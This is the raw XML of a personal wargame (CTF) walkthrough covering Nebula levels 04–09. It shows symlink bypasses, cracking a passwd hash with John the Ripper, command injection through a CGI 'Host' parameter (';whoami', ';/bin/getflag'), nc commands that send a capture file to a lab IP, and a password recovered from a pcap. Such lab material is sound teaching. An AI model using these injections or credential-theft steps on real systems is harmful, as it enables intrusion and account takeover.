      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">#include &lt;stdio.h&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">#include &lt;fcntl.h&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">int main(int argc, char **argv, char **envp)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">{</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>char buf[1024];</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>int fd, rc;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P127">// <text:span text:style-name="T60">argc – is an argument count and the counting always starts from 1</text:span></text:p>
      <text:p text:style-name="P128">// here the program is ./flag04 [file to read] . Flag04 is an argv[0]</text:p>
      <text:p text:style-name="P128">// ./flag04 pass_arg_here. pass_arg_here is an argv[1]</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>if(argc == 1) {</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>printf("%s [file to read]\n", argv[0]);</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>exit(EXIT_FAILURE);</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>}</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">// <text:span text:style-name="T60">argv is an array of argument vectors. It always starts from argv[0] and so on</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">// <text:span text:style-name="T61">if the arg[1] contains the name ‘token’ then th file is not accessed.</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>if(strstr(argv[1], "token") != NULL) {</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>printf("You may not access '%s'\n", argv[1]);</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>exit(EXIT_FAILURE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fd = open(argv[1], O_RDONLY);</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>if(fd == -1) {</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>err(EXIT_FAILURE, "Unable to open %s", argv[1]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rc = read(fd, buf, sizeof(buf));</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>if(rc == -1) {</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>err(EXIT_FAILURE, "Unable to read fd %d", fd);</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>}</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>write(1, buf, rc);</text:span></text:p>
      <text:p text:style-name="P130"><text:span text:style-name="Source_20_Text">}</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T45"/></text:span></text:p>
      <text:p text:style-name="P54"><text:s/><text:span text:style-name="T67">SOLUTION</text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P33">Task is to execute the token file bypassing the restriction to read</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P33">// Running this wont allow you to read the token file</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P59">./flag04 token</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P33">// Since the task requires you to ‘READ’ the file we need to use a <text:s/>command called ‘cat’</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">// Here again you need to link the file to bypass the authentication and read the file</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P59">which cat</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P59">ln -s /home/flag04/token /tmp/cat</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59">which cat</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P33">// For some reason executing ‘which cat’ before and after resulted in same reply ‘/bin/cat’.</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P59">./<text:span text:style-name="T59">flag04 /tmp/cat</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">// Despite of this the /tmp/cat worked well and revealed the contents of the token file </text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P60">---LEVEL05---</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P60"><text:soft-page-break/></text:p>
      <text:p text:style-name="P60">Check the <text:span text:style-name="Strong_20_Emphasis">flag05</text:span> home directory. You are looking for weak directory permissions</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P82">SOLUTION</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P61">cd /home/<text:span text:style-name="T62">level05</text:span></text:p>
      <text:p text:style-name="P61">ls -la</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P34">we can see there is <text:span text:style-name="T62">a .ssh file. Howvever there is nothing inside it.</text:span></text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P62">Cd /home/flag05</text:p>
      <text:p text:style-name="P62">ls -la</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">we can see there are two main files - .backup file and .ssh file. However .ssh file permission is denied. We look at the .backup file now as it has group and all read and execute permission</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P62">cd ./backup</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P62">tar -xvfz backup-19072011.tgz <text:s/><text:span text:style-name="T6">&lt;&lt; permission denied</text:span></text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P64">Cp <text:span text:style-name="T62">backup-19072011.tgz /</text:span>tmp</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P65">cd /tmp</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P63">tar -xvfz backup-19072011.tgz</text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P65">ls -la</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P65">cd .ssh</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P36">since its an ssh directory with the authorized keys we can login to its remote host. Here it is a localhost</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P65">ssh <text:a xlink:type="simple" xlink:href="mailto:flag05@localhost" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">flag05@localhost</text:a> &lt;&lt; didn’t work as it requires a password</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P37">Now I will try t c<text:span text:style-name="T63">opy</text:span> the <text:span text:style-name="T62">backup-19072011.tgz </text:span>file in the /home/<text:span text:style-name="T63">level05 directory and repeat the same process.</text:span></text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P38">This time it worked without asking for a password. <text:span text:style-name="T64">And so finally we retrieve the flag through:</text:span></text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P67">/bin/getflag</text:p>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P68">---LEVEL06---</text:p>
      <text:p text:style-name="P68"/>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P69">The <text:span text:style-name="Strong_20_Emphasis">flag06</text:span> account credentials came from a legacy unix system.</text:p>
      <text:p text:style-name="P69"><text:soft-page-break/></text:p>
      <text:p text:style-name="P82">SOLUTION</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P72">su level06</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P72">cd</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P39">Here it task is about the account credentials. This means we need to look into /etc/passwd file for account credentials</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P72">cd /etc</text:p>
      <text:p text:style-name="P72">cat passwd</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P39">Here we can see a list of acc.Credentials. We look into flag06 details.</text:p>
      <text:p text:style-name="P39">We can see the passwd of flag06 is <text:span text:style-name="T22">ueqwOCnSGdsuM</text:span><text:span text:style-name="T65">. </text:span>Passwords are always stored in hash. So here we can use john the ripper from my kali OS.</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P39">Save the hashed password in a file first and then run the command:</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P72">John hasedpassword.txt</text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P73"><text:span text:style-name="T3">we can see the password found is ‘hello’</text:span> </text:p>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P73">su flag06 <text:s text:c="2"/><text:span text:style-name="T3">then enter the password which is ‘hello’</text:span></text:p>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P73">/bin/getflag</text:p>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P73"/>
      <text:p text:style-name="P74">---LEVEL07---</text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P74">The <text:span text:style-name="Strong_20_Emphasis">flag07</text:span> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P122"><text:span text:style-name="Source_20_Text">#!/usr/bin/perl</text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">use CGI qw{param};</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">print "Content-type: text/html\n\n";</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">sub ping {</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$host = $_[0];</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;");</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>@output = `ping -c 3 $host 2&gt;&amp;1`; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">notice backticks – a command substituiton</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>foreach $line (@output) { print "$line"; }</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>print("&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;");</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/></text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">}</text:span></text:span></text:p>
      <text:p text:style-name="P129"><text:soft-page-break/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"># check if Host set. if not, display normal page, etc</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="P130"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">ping(param("Host")); </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">notice the parameter called ‘HOST’</text:span></text:span></text:p>
      <text:p text:style-name="P139"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T68">SOLUTION</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T66">Here I tried the same procedure as previous level with some differences.</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T23">Su level07</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T23">cd</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T23">cd /home/flag07</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T66">Here I found two scripts – a webpage and a config file. Now to run the file</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">./</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T23">index.cgi Host=127.0.0.1 </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T66"><text:s text:c="10"/>This works</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">Within the code we noticed the backticks which is a command substitution.</text:span></text:span></text:p>
      <text:p text:style-name="P131"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">./</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">index.cgi Host=;whoami <text:s text:c="11"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10"><text:s/>Test if it works...if pass then next step</text:span></text:span></text:p>
      <text:p text:style-name="P132"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">During the success I tried the following which </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">didn’t worked</text:span></text:span></text:p>
      <text:p text:style-name="P132"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">ln -s /bin/getflag /tmp/cat</text:span></text:span></text:p>
      <text:p text:style-name="P132"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">PATH=/tmp:$PATH</text:span></text:span></text:p>
      <text:p text:style-name="P132"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">./index.cgi Host=;/tmp/cat</text:span></text:span></text:p>
      <text:p text:style-name="P132"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T24">./index.cgi Host=;/bin/getflag</text:span></text:span></text:p>
      <text:p text:style-name="P132"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">All these above didn’t worked because we do not have an suid permission which would otherwise allow us the owner/root privileges. </text:span></text:span></text:p>
      <text:p text:style-name="P133"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11">Open the thttpd.conf file</text:span></text:span></text:p>
      <text:p text:style-name="P133"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">cat thttpd.conf | less</text:span></text:span></text:p>
      <text:p text:style-name="P134"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">It mentions that it is listening on port number 7007. Which indicates a webserver conf file.</text:span></text:span></text:p>
      <text:p text:style-name="P134"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">So now the we have the command substituition, a parameter ‘Host’, a web page ‘index.cgi’, a webserver running on port 7007 and a /bin/getflag on a localhost machine.</text:span></text:span></text:p>
      <text:p text:style-name="P134"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Using this we can use ‘wget’ command to exploit the vulnerability</text:span></text:span></text:p>
      <text:p text:style-name="P134"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T26">wget http://127.0.0.1:7007?Host=;/bin/getflag <text:s text:c="2"/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">&lt;&lt; This didn’t worked</text:span></text:span></text:p>
      <text:p text:style-name="P135"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">Make sure to do this within home directory or tmp directory.</text:span></text:span></text:p>
      <text:p text:style-name="P137"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T15">D</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14">elete all trash files that was downloaded from tmp and home directory</text:span></text:span></text:p>
      <text:p text:style-name="P135"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">I change ; to %3B which is urlencoding to escape semicolon</text:span></text:span></text:p>
      <text:p text:style-name="P136"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T27">cat saved_file_name</text:span></text:span></text:p>
      <text:p text:style-name="P136"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T27"/></text:span></text:p>
      <text:p text:style-name="P138"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T72">---LEVEL 8---</text:span></text:span></text:p>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P75">World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P82">SOLUTION</text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P77">su level08</text:p>
      <text:p text:style-name="P77"/>
      <text:p text:style-name="P77">cd</text:p>
      <text:p text:style-name="P77"/>
      <text:p text:style-name="P77">./<text:span text:style-name="T73">home/flag08</text:span></text:p>
      <text:p text:style-name="P77"/>
      <text:p text:style-name="P40">here we find a ‘capture.pcap’ file</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P78">strings capture.pcap | less</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P42">the string doesn’t appear to be in a plain text</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42">We would need to send this file across to my kali machine to be viewed in wireshark</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42">// <text:span text:style-name="T74">client side – here is it sending a file to the server</text:span></text:p>
      <text:p text:style-name="P42">// <text:span text:style-name="T74">pipe out the capture.pcap file to this remote ip address and port</text:span></text:p>
      <text:p text:style-name="P79">nc 192.168.56.103 4545 &lt; capture.pcap</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P43">//server side / listening port – here it is receiving a file from a client</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43">// write out the receiving contents from this port to this file</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79">nc -l -v -p 4545 &gt; capture.pcap</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79"><text:span text:style-name="T3">Vice versa can also be achieved</text:span> </text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P43">//client side – here it is <text:span text:style-name="T75">receiving a file from a server</text:span></text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79">nc 192.168.56.102 4546 &gt; capture.pcap</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P43">//server side –<text:span text:style-name="T75"> here it is sending a file to anyone who connects to this port</text:span></text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P79">nc -l -v -p 4546 &lt; capture.pcap</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P44">Finally we can analyse the file using wireshark. </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T55">In the ascii format the password looks like <text:s/></text:span><text:span text:style-name="T76">backdoor...00Rm8.ate</text:span></text:p>
      <text:p text:style-name="P83"/>
      <text:p text:style-name="P83">Changing the format to hexdump shows us the following:</text:p>
      <text:p text:style-name="P80"><text:soft-page-break/></text:p>
      <text:p text:style-name="P140">000000B9 62 b</text:p>
      <text:p text:style-name="P140">000000BA 61 a</text:p>
      <text:p text:style-name="P140">000000BB 63 c</text:p>
      <text:p text:style-name="P140">000000BC 6b k</text:p>
      <text:p text:style-name="P140">000000BD 64 d</text:p>
      <text:p text:style-name="P140">000000BE 6f o</text:p>
      <text:p text:style-name="P140">000000BF 6f o</text:p>
      <text:p text:style-name="P140">000000C0 72 r</text:p>
      <text:p text:style-name="P140">000000C1 7f .</text:p>
      <text:p text:style-name="P140">000000C2 7f .</text:p>
      <text:p text:style-name="P140">000000C3 7f .</text:p>
      <text:p text:style-name="P140">000000C4 30 0</text:p>
      <text:p text:style-name="P140">000000C5 30 0</text:p>
      <text:p text:style-name="P140">000000C6 52 R</text:p>
      <text:p text:style-name="P140">000000C7 6d m</text:p>
      <text:p text:style-name="P140">000000C8 38 8</text:p>
      <text:p text:style-name="P140">000000C9 7f .</text:p>
      <text:p text:style-name="P140">000000CA 61 a</text:p>
      <text:p text:style-name="P140">000000CB 74 t</text:p>
      <text:p text:style-name="P140">000000CC 65 e</text:p>
      <text:p text:style-name="P140">000000CD 0d .</text:p>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P90">// <text:span text:style-name="T77">using the ascii chart to follow the hex code of 7f indicates a DEL means delete. Above we can see that the user first deleted three characters in a row. This means the last three characters ‘d o o r’ was deleted. The user then wrote 00RM8. Then afterwards the user again deleted one character which is 8. User then wrote ate.</text:span></text:p>
      <text:p text:style-name="P91">Joining up altogether <text:span text:style-name="T78">the read</text:span> : backd00R<text:span text:style-name="T79">m</text:span>ate</text:p>
      <text:p text:style-name="P88">su flag08 <text:s text:c="2"/><text:span text:style-name="T3">password is </text:span><text:span text:style-name="T16">backd00Rmate</text:span></text:p>
      <text:p text:style-name="P88"><text:span text:style-name="T77">/</text:span>bin/getflag</text:p>
      <text:p text:style-name="P88"/>
      <text:p text:style-name="P89">---LEVEL09---</text:p>
      <text:p text:style-name="P92">TASK</text:p>
      <text:p text:style-name="P97">There’s a C setuid wrapper for some vulnerable PHP code</text:p>
      <text:p text:style-name="P123"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T80">&lt;?php</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">function spam($email)</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">{</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$email = preg_replace("/\./", " dot ", $email);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$email = preg_replace("/@/", " AT ", $email);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/></text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>return $email;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">}</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">function markup($filename, $use_me)</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">{</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$contents = file_get_contents($filename);</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$contents = preg_replace("/\[/", "&lt;", $contents);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>$contents = preg_replace("/\]/", "&gt;", $contents);</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20"><text:s text:c="2"/>return $contents;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">}</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">$output = markup($argv[1], $argv[2]);</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">print $output;</text:span></text:span></text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="P130"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T20">?&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P93">SOLUTION <text:s/><text:span text:style-name="T83">--- UNDONE</text:span></text:p>
      <text:p text:style-name="P93"/>
      <text:p text:style-name="P102">su level09</text:p>
      <text:p text:style-name="P102">cd</text:p>
      <text:p text:style-name="P102">cd /home/flag09</text:p>
      <text:p text:style-name="P98">here we can see the program flag09 has a suid permission <text:span text:style-name="T82">and a vulnerable php code</text:span></text:p>
      <text:p text:style-name="P1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22:50:38.405000000</meta:creation-date>
    <meta:generator>LibreOffice/5.1.0.3$Windows_x86 LibreOffice_project/5e3e00a007d9b3b6efb6797a8b8e57b51ab1f737</meta:generator>
    <dc:date>2017-02-23T05:27:25.298000000</dc:date>
    <meta:editing-duration>PT12H15M56S</meta:editing-duration>
    <meta:editing-cycles>85</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="12" meta:paragraph-count="338" meta:word-count="2011" meta:character-count="11980" meta:non-whitespace-character-count="10115"/>
  </office:meta>
</office:document-meta>
</file>